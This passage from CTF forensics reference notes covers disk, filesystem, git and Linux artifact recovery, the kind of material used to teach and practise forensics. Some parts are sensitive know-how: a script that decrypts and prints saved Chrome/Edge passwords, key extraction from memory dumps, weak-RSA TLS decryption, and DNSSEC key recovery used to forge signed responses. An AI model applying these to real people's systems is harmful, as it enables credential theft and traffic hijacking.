with open('data.bson', 'rb') as f:
    data = bytearray(f.read())

# Fix size header if corrupted (e.g., missing first 3 bytes)
import struct
correct_size = len(data) + 3  # account for missing bytes
data = struct.pack('<I', correct_size)[1:] + data  # prepend missing bytes

# Parse BSON documents
docs = bson.decode_all(bytes(data))
for doc in docs:
    print(doc)

# Reconstruct file from BSON chunks (common pattern):
# Each document has: {index: N, data: "base64_chunk"}
import base64
chunks = sorted(docs, key=lambda d: d.get('index', d.get('i', 0)))
reconstructed = b''
for chunk in chunks:
    b64_data = chunk.get('data', chunk.get('d', ''))
    reconstructed += base64.b64decode(b64_data)

with open('reconstructed.png', 'wb') as f:
    f.write(reconstructed)
```

**Key insight:** BSON starts with a 4-byte little-endian size field. If the file appears corrupted, check if the first bytes are missing or incorrect. Parse with `bson.decode_all()` (from pymongo), sort chunks by index, and concatenate base64-decoded data to reconstruct embedded files.

---

## TrueCrypt / VeraCrypt Volume Mounting (GreHack CTF 2016)

Encrypted volumes in CTF challenges may use TrueCrypt or VeraCrypt. Identify by logo/branding clues, then mount with a recovered keyfile or password.

```bash
# Identify TrueCrypt volumes:
# - No file signature/magic bytes (by design)
# - Exact size is multiple of 512 bytes
# - High entropy throughout the file
# - Context clues: TrueCrypt logo in related images

# Mount with password:
truecrypt -t -p "password123" volume.tc /mnt/tc
veracrypt -t -p "password123" volume.tc /mnt/vc

# Mount with keyfile (no password):
truecrypt -t -p "" -k keyfile.png volume.tc /mnt/tc
veracrypt -t -p "" -k keyfile.png volume.tc /mnt/vc

# Mount hidden volume (different password):
truecrypt -t -p "hidden_password" volume.tc /mnt/tc

# Common keyfile locations in CTFs:
# - Images extracted from other challenge steps
# - GPG-encrypted files with keys found in git repos
# - Files embedded in other forensic artifacts

# If TrueCrypt is not available (discontinued):
# Use VeraCrypt (backwards-compatible with TrueCrypt volumes)
# Add --truecrypt flag for old TC volumes:
veracrypt -t --truecrypt -p "password" volume.tc /mnt/vc
```

**Key insight:** TrueCrypt volumes have no magic bytes or identifiable header -- they look like random data. Identify them from context clues (related images showing TrueCrypt logo, file sizes that are exact multiples of 512, or challenge descriptions mentioning encryption). VeraCrypt with `--truecrypt` flag handles legacy TC volumes.

---

## See Also

- [disk-advanced.md](disk-advanced.md) - Advanced disk and memory techniques (deleted partition recovery, ZFS forensics, GPT GUID encoding, VMDK sparse parsing, memory dump string carving, ransomware key recovery, WordPerfect macro XOR, minidump ISO 9660 recovery, APFS snapshot recovery, RAID 5 XOR recovery)
- [disk-recovery.md](disk-recovery.md) - Disk recovery and extraction patterns (LUKS master key recovery, PRNG timestamp seed brute-force, VBA macro binary recovery, FemtoZip decompression, XFS reconstruction, tar duplicate entry extraction, nested matryoshka filesystem extraction, anti-carving via null byte interleaving)


# disk-recovery

# CTF Forensics - Disk Recovery and Extraction Patterns

## Table of Contents
- [LUKS Master Key Recovery from Memory Dump (Hack.lu 2015)](#luks-master-key-recovery-from-memory-dump-hacklu-2015)
- [PRNG Timestamp Seed Brute-Force for Encryption Key Recovery (CSAW 2015)](#prng-timestamp-seed-brute-force-for-encryption-key-recovery-csaw-2015)
- [VBA Macro Encoded Binary Recovery (Sharif CTF 2016)](#vba-macro-encoded-binary-recovery-sharif-ctf-2016)
- [FemtoZip Shared Dictionary Decompression (Sharif CTF 2016)](#femtozip-shared-dictionary-decompression-sharif-ctf-2016)
- [XFS Filesystem Reconstruction from Corrupted Metadata (BSidesSF 2025)](#xfs-filesystem-reconstruction-from-corrupted-metadata-bsidessf-2025)
- [Tar Archive Duplicate Entry Extraction (BSidesSF 2025)](#tar-archive-duplicate-entry-extraction-bsidessf-2025)
- [Nested Matryoshka Filesystem Extraction (BSidesSF 2025)](#nested-matryoshka-filesystem-extraction-bsidessf-2025)
- [Anti-Carving via Null Byte Interleaving (BSidesSF 2024)](#anti-carving-via-null-byte-interleaving-bsidessf-2024)
- [BTRFS Subvolume/Snapshot Recovery (BSidesSF 2026)](#btrfs-subvolumesnapshot-recovery-bsidessf-2026)
- [FAT16 Free Space Data Recovery (BSidesSF 2026)](#fat16-free-space-data-recovery-bsidessf-2026)
- [FAT16 Deleted File Recovery via Sleuth Kit (MetaCTF Flash 2026)](#fat16-deleted-file-recovery-via-sleuth-kit-metactf-flash-2026)
- [Ext2 Orphaned Inode Recovery via fsck (BSidesSF 2026)](#ext2-orphaned-inode-recovery-via-fsck-bsidessf-2026)
- [Corrupted ZIP Repair via Header Field Manipulation (PlaidCTF 2017)](#corrupted-zip-repair-via-header-field-manipulation-plaidctf-2017)
- [Recovering Deleted .git Repository from FAT Image (Square CTF 2017)](#recovering-deleted-git-repository-from-fat-image-square-ctf-2017)
- [DNSSEC Key Recovery from Git Commit History (Hack.lu 2017)](#dnssec-key-recovery-from-git-commit-history-hacklu-2017)
- [See Also](#see-also)

---

## LUKS Master Key Recovery from Memory Dump (Hack.lu 2015)

Recover LUKS encryption keys from VM memory dumps using AES key schedule detection:

1. **Extract memory:** Obtain memory dump from VM snapshot (.elf, .vmem, .raw)
2. **Find AES keys:** Use `aeskeyfind` to detect AES key schedules in memory

```bash
aeskeyfind memory.elf
# Output: candidate AES-256 keys (64 hex chars each)
```

3. **Write key to file:** Convert hex key to binary

```bash
echo "deadbeef..." | xxd -r -p > master.key
```

4. **Add new LUKS passphrase using master key:**

```bash
cryptsetup luksAddKey --master-key-file master.key /dev/mapper/volume
# Enter new passphrase when prompted
cryptsetup luksOpen /dev/mapper/volume decrypted
mount /dev/mapper/decrypted /mnt
```

**Key insight:** AES key schedules have a distinctive mathematical structure that `aeskeyfind` detects regardless of where they appear in memory. Works for LUKS, dm-crypt, FileVault, and BitLocker volumes.

Companion tools: `rsakeyfind` (RSA keys), `aesfix` (corrupted key recovery).

---

## PRNG Timestamp Seed Brute-Force for Encryption Key Recovery (CSAW 2015)

When encryption keys are generated from PRNG seeded with timestamps, brute-force the seed:

1. **Identify seed source:** Look for `Time.now.to_i`, `time(NULL)`, `System.currentTimeMillis()` used as PRNG seed
2. **Determine time window:** Use file metadata (creation/modification timestamps) to bound the search
3. **Brute-force seeds:** Try each second in a +/-24 hour window around the file timestamp

```python
import struct
from Crypto.Cipher import AES

# Ruby-compatible Random implementation (or use ctypes for C rand)
for seed in range(timestamp - 86400, timestamp + 86400):
    rng = RandomWithSeed(seed)
    key = bytes([rng.rand(256) for _ in range(32)])  # AES-256
    iv = bytes([rng.rand(256) for _ in range(16)])

    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)

    # Validate: check for known file signatures
    if plaintext[:4] == b'\x89PNG' or plaintext[:2] == b'\xff\xd8':
        print(f"Found key with seed: {seed}")
        break
```

**Key insight:** Expand the time window beyond the obvious timestamp -- clock skew, timezone differences, and filesystem granularity can shift the effective seed by hours.

---

## VBA Macro Encoded Binary Recovery (Sharif CTF 2016)

Excel/Word macros may encode binary data in cell values. Extract and decode:

1. **Extract macro:** Use `olevba` or open in LibreOffice to inspect VBA code
2. **Identify encoding:** Look for cell iteration patterns like `Cells(i, j).Value`
3. **Reverse the encoding formula:**

```python
# If macro encodes as: cell_value = byte_value * 3 + 78
# Reverse: byte_value = (cell_value - 78) // 3

import openpyxl
wb = openpyxl.load_workbook('challenge.xlsx')
ws = wb.active

binary_data = bytearray()
for row in ws.iter_rows():
    for cell in row:
        if cell.value is not None:
            binary_data.append((int(cell.value) - 78) // 3)

with open('recovered.elf', 'wb') as f:
    f.write(binary_data)
```

**Key insight:** Check the recovered file with `file` command -- common outputs are ELF binaries, PE executables, or images containing the flag.

---

## FemtoZip Shared Dictionary Decompression (Sharif CTF 2016)

FemtoZip uses a shared dictionary model for compressing corpora of similar documents. When given a `.model` file and compressed data:

```bash
# Install femtozip
git clone https://github.com/gtoubassi/femtozip
cd femtozip && make

# Decompress using provided model
./fzip --model fashion.model --decompress compressed_dir/ --output decompressed_dir/
```

After decompression, search through potentially thousands of files:

```bash
# Filter by metadata fields
grep -r "category.*forensic" decompressed_dir/ | grep "year.*2016"
```

**Key insight:** FemtoZip is rare in CTFs. Identify it by the `.model` file and the presence of many small compressed files that share common structure (JSON, XML templates).

---

## XFS Filesystem Reconstruction from Corrupted Metadata (BSidesSF 2025)

When XFS superblock or allocation group metadata is corrupted but inodes are intact:

1. **Parse inode directly:** XFS inodes contain extent lists with `[startoff, startblock, blockcount]` tuples
2. **Calculate block offsets:** Multiply startblock by filesystem block size (typically 4K)
3. **Extract file data:** Copy blocks directly from the raw disk image

```bash
# Extract file from known inode extent
# startblock=104333, blockcount=256, block_size=4096
dd if=disk.img bs=4096 skip=104333 count=256 of=recovered.jpg

# Parse XFS inode structure (at known offset)
python3 -c "
import struct
with open('disk.img', 'rb') as f:
    f.seek(inode_offset)
    magic = f.read(2)  # 'IN' = 0x494e
    # Parse di_core (96 bytes): mode, uid, gid, nlink, size, etc.
    # Parse extent list: each extent = 16 bytes
    # startoff (54 bits) | startblock (52 bits) | blockcount (21 bits)
"
```

**Key insight:** XFS stores extent maps inline in the inode (up to ~4 extents). For files with more extents, follow the B+tree root in the inode. Use `xfs_db` if available: `xfs_db -r disk.img` → `inode <num>` → `print`.

---

## Tar Archive Duplicate Entry Extraction (BSidesSF 2025)

Tar format allows multiple entries with the same filename. Standard extraction overwrites earlier entries, but specific occurrences can be targeted:

```bash
# List all entries (shows duplicates)
tar -tvf archive.tar.xz | grep -c '^\.'

# Extract specific occurrence (1-indexed)
tar -Jxvf archive.tar.xz '.' --occurrence=2 -O > second_entry.bin

# Extract all occurrences via file carving
binwalk -e archive.tar
# Or iterate programmatically
python3 -c "
import tarfile
with tarfile.open('archive.tar.xz') as tf:
    for i, member in enumerate(tf.getmembers()):
        if member.name == '.':
            data = tf.extractfile(member).read()
            with open(f'entry_{i}.bin', 'wb') as f:
                f.write(data)
"
```

**Key insight:** The `--occurrence=N` flag in GNU tar selects the Nth entry with a matching name. Without it, only the last entry survives extraction. Challenges may hide flags in middle entries that normal extraction skips.

---

## Nested Matryoshka Filesystem Extraction (BSidesSF 2025)

Disk images containing nested compressed filesystem layers (potentially 10-20+ levels deep):

```bash
#!/bin/bash
# Automated layer extraction
IMG="disk.img"
for i in $(seq 1 20); do
    echo "=== Layer $i ==="
    file "$IMG"

    # Detect and decompress
    case "$(file -b "$IMG")" in
        *XZ*)     xz -d "$IMG"; IMG="${IMG%.xz}" ;;
        *gzip*)   gunzip "$IMG"; IMG="${IMG%.gz}" ;;
        *ext4*)
            mkdir -p "layer_$i"
            sudo mount -o ro,loop "$IMG" "layer_$i"
            IMG=$(find "layer_$i" -type f -name "*.img" -o -name "*.xz" | head -1)
            ;;
        *ISO*|*HFS*|*XFS*|*AmigaDOS*)
            mkdir -p "layer_$i"
            sudo mount -o ro,loop "$IMG" "layer_$i" 2>/dev/null || \
            sudo mount -t affs -o ro,loop "$IMG" "layer_$i" 2>/dev/null
            IMG=$(find "layer_$i" -type f | head -1)
            ;;
    esac
done
```

Filesystem types encountered: ext4, XFS, HFS/HFS+, AFFS (AmigaDOS), FAT. Use `losetup` with `--offset` for partitioned images. Final layer typically contains an image or text file with the flag.

**Key insight:** Install uncommon filesystem drivers (`hfsplus`, `affs`) beforehand. Some layers require manual sector offset calculation when partition tables are absent.

---

## Anti-Carving via Null Byte Interleaving (BSidesSF 2024)

Files stored with null bytes inserted at every other position defeat magic-byte-based file carving tools (binwalk, foremost, scalpel):

1. **Identify anti-carving:** File carving finds nothing, but `xfs_db` or filesystem-level tools show the file exists with correct size
2. **Extract raw blocks:** Use filesystem extent information to locate file data

```bash
# XFS: find file extents
xfs_db -r disk.img -c 'inode <inum>' -c 'print'
# Extract extent data
dd if=disk.img bs=4096 skip=<startblock> count=<blockcount> of=raw.bin
```

3. **Remove interleaved null bytes:** Keep only even-positioned (or odd-positioned) bytes

```python
with open('raw.bin', 'rb') as f:
    data = f.read()
# Remove null bytes at odd positions
cleaned = bytes(data[i] for i in range(0, len(data), 2))
with open('recovered.png', 'wb') as f:
    f.write(cleaned)
```

```perl
# Perl one-liner equivalent
perl -0777 -pe 's/(.)./\1/gs' raw.bin > recovered.png
```

**Key insight:** When file carving fails but the filesystem metadata is intact, extract via block-level access and look for byte-level obfuscation patterns. Null byte interleaving doubles the file size — compare actual size vs expected size as a detection heuristic.

---

---

## BTRFS Subvolume/Snapshot Recovery (BSidesSF 2026)

**Pattern (turn-back-the-clock):** Deleted files on a BTRFS filesystem may persist in snapshots or alternate subvolumes. The default mount shows only the active subvolume, but backup snapshots contain historical file states.

**Recovery workflow:**
```bash
# 1. Set up loop device
sudo losetup /dev/loop0 challenge.img

# 2. List available subvolumes
sudo btrfs subvolume list /dev/loop0
# Output: ID 256 gen 7 top level 5 path @
#         ID 257 gen 5 top level 5 path @backup

# 3. Mount the default subvolume (may show deleted files as missing)
sudo mount /dev/loop0 /mnt/default
ls /mnt/default/  # Flag file missing

# 4. Mount the backup subvolume
sudo mount -o subvol=@backup /dev/loop0 /mnt/backup
ls /mnt/backup/   # Flag file present!
cat /mnt/backup/flag.txt

# 5. Alternative: mount by subvolume ID
sudo mount -o subvolid=257 /dev/loop0 /mnt/backup
```

**Key BTRFS commands for forensics:**
```bash
# Show filesystem info
btrfs filesystem show /dev/loop0

# List all subvolumes (including snapshots)
btrfs subvolume list -a /mnt

# Show snapshot details
btrfs subvolume show /mnt/@backup

# Find deleted subvolumes (orphaned)
btrfs-find-root /dev/loop0
```

**BTRFS snapshot types:**
- **Writable subvolumes:** `@`, `@home` — standard Ubuntu layout
- **Read-only snapshots:** Created by `btrfs subvolume snapshot -r` — immutable copies
- **Backup subvolumes:** `@backup`, `@snap-YYYYMMDD` — naming varies by tool (Timeshift, snapper)

**Key insight:** BTRFS is copy-on-write. Deleting a file from the active subvolume doesn't erase the data if a snapshot or alternate subvolume still references those blocks. Always enumerate all subvolumes with `btrfs subvolume list`. The `-o subvol=` mount option is the key to accessing non-default subvolumes.

**Detection:** `file disk.img` shows "BTRFS Filesystem". Challenge mentions "snapshots", "time travel", "turn back", or "recovery".

**References:** BSidesSF 2026 "turn-back-the-clock"

---

## FAT16 Free Space Data Recovery (BSidesSF 2026)

**Pattern (freeflag):** Data is hidden in the free (unallocated) clusters of a FAT16 filesystem. The mounted filesystem shows no suspicious files, but free clusters contain recoverable data.

```python
import struct

with open("disk.img", "rb") as f:
    # Read FAT16 boot sector
    f.seek(0)
    boot = f.read(512)
    bytes_per_sector = struct.unpack_from("<H", boot, 11)[0]
    sectors_per_cluster = boot[13]
    reserved_sectors = struct.unpack_from("<H", boot, 14)[0]
    num_fats = boot[16]
    sectors_per_fat = struct.unpack_from("<H", boot, 22)[0]
    root_entries = struct.unpack_from("<H", boot, 17)[0]

    cluster_size = bytes_per_sector * sectors_per_cluster
    fat_start = reserved_sectors * bytes_per_sector
    root_dir_start = fat_start + (num_fats * sectors_per_fat * bytes_per_sector)
    data_start = root_dir_start + (root_entries * 32)

    # Read FAT table
    f.seek(fat_start)
    fat = f.read(sectors_per_fat * bytes_per_sector)

    # Find free clusters (FAT entry == 0x0000)
    free_data = b""
    for cluster in range(2, len(fat) // 2):
        entry = struct.unpack_from("<H", fat, cluster * 2)[0]
        if entry == 0x0000:  # Free cluster
            offset = data_start + (cluster - 2) * cluster_size
            f.seek(offset)
            free_data += f.read(cluster_size)

    # Search for flag in free space
    if b"CTF{" in free_data:
        idx = free_data.index(b"CTF{")
        print(free_data[idx:idx+100])
```

**Key insight:** FAT16/FAT32 mark deleted file clusters as "free" (entry = 0x0000) but don't zero the data. Enumerating free clusters and reading their contents recovers deleted or hidden data. Tools like `foremost`, `scalpel`, or manual FAT parsing extract this data. Check the volume label for hints (e.g., "FREESPACE").

**When to recognize:** Challenge provides a filesystem image. Mounting shows nothing useful, but `file` identifies it as FAT16/FAT32. Volume label or challenge description hints at "free space", "deleted", or "hidden in plain sight".

**References:** BSidesSF 2026 "freeflag"

---

## FAT16 Deleted File Recovery via Sleuth Kit (MetaCTF Flash 2026)

**Pattern (rm -rf flag.png):** A file has been deleted from a FAT16 filesystem image. The file's data and cluster chain remain intact, but the directory entry's first byte is replaced with `0xE5` (the FAT deletion marker). Sleuth Kit's `fls` and `icat` recover the file by inode.

```bash
# Step 1: Identify the filesystem
file flash.img
# flash.img: DOS/MBR boot sector, code offset 0x3e+2, ... FAT (16 bit) ...

# Step 2: List all files including deleted ones (-d = deleted only, -r = recursive)
fls -r -d flash.img
# r/r * 4:    _lag.png    (first char replaced by FAT deletion marker)

# Step 3: Recover the deleted file by its inode number
icat flash.img 4 > recovered_flag.png

# Step 4: Verify recovery
file recovered_flag.png
# recovered_flag.png: PNG image data, 800 x 600, 8-bit/color RGBA
```

**Key insight:** FAT16/FAT32 deletion only marks the directory entry's first byte as `0xE5` and marks clusters as free in the FAT table, but the actual file data remains on disk until overwritten. The filename appears scrambled (e.g., `flag.png` becomes `_lag.png`), but `fls -d` lists deleted entries and `icat` extracts the full file by following the original cluster chain. This is more targeted than free space carving because it preserves the original file boundaries.

**When to recognize:** Challenge provides a FAT filesystem image with a deleted file. The challenge name or description hints at deletion (`rm`, `deleted`, `removed`). Mount shows the file is missing, but `fls` reveals the deleted directory entry.

**Alternative approaches:**
- `foremost` / `scalpel` for carving without filesystem awareness
- `fatcat` for low-level FAT manipulation
- Manual hex editing: search for `0xE5` entries in directory clusters

**References:** MetaCTF Flash CTF 2026 "rm -rf flag.png"

---

## Ext2 Orphaned Inode Recovery via fsck (BSidesSF 2026)

**Pattern (orphan):** A file has been deleted from an ext2 filesystem, leaving an orphaned inode. The file doesn't appear in any directory listing, but `fsck` detects the unattached inode and can reconnect it to `/lost+found`.

```bash
# Mount the image — no flag visible
sudo mount -o loop disk.img /mnt
ls /mnt  # Nothing useful

# Run fsck to detect orphaned inodes
sudo umount /mnt
e2fsck -y disk.img
# Output: "Unattached inode 13"
# Output: "Connect to /lost+found? yes"

# Re-mount and check lost+found
sudo mount -o loop disk.img /mnt
ls /mnt/lost+found/
# Found: #13
file /mnt/lost+found/\#13  # Identify file type (e.g., PNG)
cp /mnt/lost+found/\#13 recovered_flag.png
```

**Key insight:** Ext2/ext3/ext4 deletion removes directory entries but the inode and data blocks may persist until overwritten. `e2fsck` (with `-y` for auto-fix) detects these orphaned inodes and reconnects them to `/lost+found` with numeric names. For ext2 specifically (no journaling), recovery is more reliable because blocks aren't zeroed on deletion.

**When to recognize:** Challenge provides an ext2/ext3/ext4 filesystem image. Normal mounting shows nothing. Challenge hints at "deleted", "orphan", "lost", or "recovery". Always run `fsck` on forensics filesystem images.

**Alternative tools:**
- `debugfs` — interactive ext2 exploration: `debugfs disk.img` then `lsdel` to list deleted inodes
- `extundelete` — automated ext3/ext4 recovery
- `icat` (Sleuth Kit) — extract file by inode number: `icat disk.img 13 > recovered`

**References:** BSidesSF 2026 "orphan"

---

## Corrupted ZIP Repair via Header Field Manipulation (PlaidCTF 2017)

ZIP archives with corrupted filename length fields can be repaired by hex-editing both the Local File Header and Central Directory Entry.

```python
# ZIP Local File Header format (at offset 0x04 from PK\x03\x04):
# Offset 26: filename length (2 bytes, little-endian)
# ZIP Central Directory Entry (at PK\x01\x02):
# Offset 28: filename length (2 bytes, little-endian)

# Fix: set both filename lengths to actual filename size
import struct
with open('broken.zip', 'rb') as f:
    data = bytearray(f.read())

# Find and fix Local File Header filename length
lfh = data.index(b'PK\x03\x04')
struct.pack_into('<H', data, lfh + 26, 8)  # set to 8 bytes

# Find and fix Central Directory filename length
cde = data.index(b'PK\x01\x02')
struct.pack_into('<H', data, cde + 28, 8)  # must match

# Write fixed bytes as filename
data[lfh+30:lfh+38] = b'flag.txt'

with open('fixed.zip', 'wb') as f:
    f.write(data)

# Alternative: brute-force deflate at candidate offsets
import zlib
with open('broken.zip', 'rb') as f:
    raw = f.read()
for offset in range(0x1E, 0x100):
    try:
        result = zlib.decompress(raw[offset:], -15)
        print(f"Offset {offset:#x}: {result}")
        break
    except zlib.error:
        continue
```

**Key insight:** ZIP filename length fields appear in both the Local File Header (offset 26) and Central Directory (offset 28). Both must match and reflect the actual filename. When these are corrupted to absurd values (e.g., 9001), the archive appears empty. As a fallback, brute-force raw deflate decompression at candidate data offsets.

**Detection:** ZIP file that `unzip -l` reports as empty or produces errors about invalid filename lengths. `hexdump` shows valid `PK\x03\x04` and `PK\x01\x02` signatures but unreasonable values in length fields.

---

## Recovering Deleted .git Repository from FAT Image (Square CTF 2017)

A FAT filesystem image with a deleted `.git` directory. Use TSK `fls -r` to list all files including deleted ones (marked with `*`). Extract deleted inodes with `icat`. Reconstruct the git object directory structure from the extracted files, then use `git fsck` and `git log` to recover commit history and flag.

```bash
# Step 1: List all files including deleted ones (* prefix = deleted)
fls -r disk.img | grep '\*'
# Example output:
# r/r * 5:   .git/HEAD
# r/r * 6:   .git/config
# r/r * 7:   .git/objects/ab/cdef1234...

# Step 2: Extract deleted files by inode number
icat disk.img 5 > HEAD
icat disk.img 6 > config
# Repeat for all git object inodes

# Step 3: Rebuild .git directory structure
mkdir -p recovered/.git/objects/ab/
# Place each extracted object at its correct path

# Step 4: Recover commit history
cd recovered
git fsck --full        # Check object integrity, find dangling commits
git log --all          # Show all commits including unreferenced ones
git show <commit_hash> # Inspect specific commit for flag
```

**Key insight:** FAT marks deleted files by changing the first byte of the directory entry to `0xE5` but keeps cluster data intact until reused. TSK's `fls`/`icat` extracts deleted files by inode, making deletion forensically reversible. Git objects are content-addressed — once extracted, `git fsck` finds all reachable commits even without a valid HEAD reference.

---

## DNSSEC Key Recovery from Git Commit History (Hack.lu 2017)

DNSSEC private signing keys committed to a git repository and later deleted remain permanently in the commit history. Recover the keys to set up a local BIND instance and forge DNSSEC-signed DNS responses.

```bash
# Step 1: Find commits that deleted key files
git log --all --diff-filter=D -- '*.private' '*.key' 'Kexample.*.+*.+*.key'

# Step 2: Recover the deleted key files from the commit before deletion
git show <commit_hash>^:<path/to/Kzone.+005+12345.private> > recovered.private
git show <commit_hash>^:<path/to/Kzone.+005+12345.key> > recovered.key

# Alternative: search all commits for key material
git log --all -p -- '*.private' | grep -A 20 'Private-key-format'

# Step 3: Verify key contents
cat recovered.private
# Private-key-format: v1.3
# Algorithm: 5 (RSASHA1)
# ...

# Step 4: Use recovered keys to forge DNSSEC-signed responses
# Configure BIND with the recovered signing keys and sign the zone
dnssec-signzone -K /path/to/keys -o example.com zone.db
```

**Key insight:** Sensitive cryptographic key material in git history is permanently recoverable — `git log --diff-filter=D` finds all commits that deleted files, and `git show <commit>^:<path>` retrieves the file's state just before deletion. DNSSEC private keys enable forging any DNS record for the zone, allowing DNS cache poisoning or redirecting traffic to attacker-controlled servers.

---

## See Also

- [disk-and-memory.md](disk-and-memory.md) - Core disk/memory forensics (Volatility, disk image analysis, VM/OVA/VMDK, VMware snapshots, coredumps, KAPE triage, PowerShell ransomware, Android/Docker/cloud forensics, BSON reconstruction, TrueCrypt/VeraCrypt mounting)
- [disk-advanced.md](disk-advanced.md) - Advanced disk and memory techniques (deleted partitions, ZFS forensics, GPT GUID encoding, VMDK sparse parsing, memory dump string carving, ransomware key recovery, WordPerfect macro XOR, minidump ISO 9660 recovery, APFS snapshots, RAID 5 XOR recovery)


# linux-forensics

# CTF Forensics - Linux and Application Forensics

## Table of Contents
- [Log Analysis](#log-analysis)
- [Linux Attack Chain Forensics](#linux-attack-chain-forensics)
- [Docker Image Forensics (Pragyan 2026)](#docker-image-forensics-pragyan-2026)
- [Browser Credential Decryption](#browser-credential-decryption)
- [Firefox Browser History (places.sqlite)](#firefox-browser-history-placessqlite)
- [USB Audio Extraction from PCAP](#usb-audio-extraction-from-pcap)
- [TFTP Netascii Decoding](#tftp-netascii-decoding)
- [TLS Traffic Decryption via Weak RSA](#tls-traffic-decryption-via-weak-rsa)
- [ROT18 Decoding](#rot18-decoding)
- [Common Encodings](#common-encodings)
- [Git Directory Recovery (UTCTF 2024)](#git-directory-recovery-utctf-2024)
- [KeePass Database Extraction and Cracking (H7CTF 2025)](#keepass-database-extraction-and-cracking-h7ctf-2025)
- [Git Reflog and fsck for Squashed Commit Recovery (BearCatCTF 2026)](#git-reflog-and-fsck-for-squashed-commit-recovery-bearcatctf-2026)
- [Browser Artifact Analysis](#browser-artifact-analysis)
  - [Chrome/Chromium](#chromechromium)
  - [Firefox](#firefox)
- [Corrupted Git Blob Repair via Byte Brute-Force (CSAW CTF 2015)](#corrupted-git-blob-repair-via-byte-brute-force-csaw-ctf-2015)
- [VBA Macro Forensics - Excel Cell Data to ELF Binary (Sharif CTF 2016)](#vba-macro-forensics---excel-cell-data-to-elf-binary-sharif-ctf-2016)
- [Ethereum / Blockchain Transaction Tracing (Defenit CTF 2020)](#ethereum--blockchain-transaction-tracing-defenit-ctf-2020)
- [Python In-Memory Source Recovery via pyrasite (Insomni'hack 2017)](#python-in-memory-source-recovery-via-pyrasite-insomnihack-2017)

---

## Log Analysis

```bash
# Search for flag fragments
grep -iE "(flag|part|piece|fragment)" server.log

# Reconstruct fragmented flags
grep "FLAGPART" server.log | sed 's/.*FLAGPART: //' | uniq | tr -d '\n'

# Find anomalies
sort logfile.log | uniq -c | sort -rn | head
```

---

## Linux Attack Chain Forensics

**Pattern (Making the Naughty List):** Full attack timeline from logs + PCAP + malware.

**Evidence sources:**
```bash
# SSH session commands
grep -A2 "session opened" /var/log/auth.log

# User command history
cat /home/*/.bash_history

# Downloaded malware
find /usr/bin -newer /var/log/auth.log -name "ms*"

# Network exfiltration
tshark -r capture.pcap -Y "tftp" -T fields -e tftp.source_file
```

**Common malware pattern:** AES-ECB encrypt + XOR with same key, save as .enc

---

## Docker Image Forensics (Pragyan 2026)

**Pattern (Plumbing):** Sensitive data leaked during Docker build but cleaned in later layers.

**Key insight:** Docker image config JSON (`blobs/sha256/<config_hash>`) permanently preserves ALL `RUN` commands in the `history` array, regardless of subsequent cleanup.

```bash
tar xf app.tar
# Find config blob (not layer blobs)
python3 -m json.tool blobs/sha256/<config_hash> | grep -A2 "created_by"
# Look for RUN commands with flag data, passwords, secrets
```

**Analysis steps:**
1. Extract the Docker image tar: `tar xf app.tar`
2. Read `manifest.json` to find the config blob hash
3. Parse the config blob JSON for `history[].created_by` entries
4. Each entry shows the exact Dockerfile command that was run
5. Secrets echoed, written, or processed in any `RUN` command are preserved in the history
6. Even if a later layer `rm -f secret.txt`, the `RUN echo "flag{...}" > secret.txt` remains visible

---

## Browser Credential Decryption

**Chrome/Edge Login Data decryption (requires master_key.txt):**
```python
from Crypto.Cipher import AES
import sqlite3, json, base64

# Load master key (from Local State file, DPAPI-protected)
with open('master_key.txt', 'rb') as f:
    master_key = f.read()

conn = sqlite3.connect('Login Data')
cursor = conn.cursor()
cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
for url, user, encrypted_pw in cursor.fetchall():
    # v10/v11 prefix = AES-GCM encrypted
    nonce = encrypted_pw[3:15]
    ciphertext = encrypted_pw[15:-16]
    tag = encrypted_pw[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    password = cipher.decrypt_and_verify(ciphertext, tag)
    print(f"{url}: {user}:{password.decode()}")
```

**Master key extraction from Local State:**
```python
import json, base64
with open('Local State', 'r') as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
# Remove DPAPI prefix (5 bytes "DPAPI")
encrypted_key = encrypted_key[5:]
# On Windows: CryptUnprotectData to get master_key
# In CTF: master_key may be provided separately
```

---

## Firefox Browser History (places.sqlite)

**Pattern (Browser Wowser):** Flag hidden in browser history URLs.

```bash
# Quick method
strings places.sqlite | grep -i "flag\|MetaCTF"

# Proper forensic method
sqlite3 places.sqlite "SELECT url FROM moz_places WHERE url LIKE '%flag%'"
```

**Key tables:** `moz_places` (URLs), `moz_bookmarks`, `moz_cookies`

---

## USB Audio Extraction from PCAP

**Pattern (Talk To Me):** USB isochronous transfers contain audio data.

**Extraction workflow:**
```bash
# Export ISO data with tshark
tshark -r capture.pcap -T fields -e usb.iso.data > audio_data.txt

# Convert to raw audio and import into Audacity
# Settings: signed 16-bit PCM, mono, appropriate sample rate
# Listen for spoken flag characters
```

**Identification:** USB transfer type URB_ISOCHRONOUS = real-time audio/video

---

## TFTP Netascii Decoding

**Problem:** TFTP netascii mode corrupts binary transfers; Wireshark doesn't auto-decode.

**Fix exported files:**
```python
# Replace netascii sequences:
# 0d 0a → 0a (CRLF → LF)
# 0d 00 → 0d (escaped CR)
with open('file_raw', 'rb') as f:
    data = f.read()
data = data.replace(b'\r\n', b'\n').replace(b'\r\x00', b'\r')
with open('file_fixed', 'wb') as f:
    f.write(data)
```

---

## TLS Traffic Decryption via Weak RSA

**Pattern (Tampered Seal):** TLS 1.2 with `TLS_RSA_WITH_AES_256_CBC_SHA` (no PFS).

**Attack flow:**
1. Extract server certificate from Server Hello packet (Export Packet Bytes -> `public.der`)
2. Get modulus: `openssl x509 -in public.der -inform DER -noout -modulus`
3. Factor weak modulus (dCode, factordb.com, yafu)
4. Generate private key: `rsatool -p P -q Q -o private.pem`
5. Add to Wireshark: Edit -> Preferences -> TLS -> RSA keys list

**After decryption:**
- Follow TLS streams to see HTTP traffic
- Export objects (File -> Export Objects -> HTTP)
- Look for downloaded executables, API calls

---

## ROT18 Decoding

ROT13 on letters + ROT5 on digits. Common final layer in multi-stage forensics:
```python
def rot18(text):
    result = []
    for c in text:
        if c.isalpha():
            base = ord('a') if c.islower() else ord('A')
            result.append(chr((ord(c) - base + 13) % 26 + base))
        elif c.isdigit():
            result.append(str((int(c) + 5) % 10))
        else:
            result.append(c)
    return ''.join(result)
```

---

## Common Encodings

```bash
echo "base64string" | base64 -d
echo "hexstring" | xxd -r -p
# ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

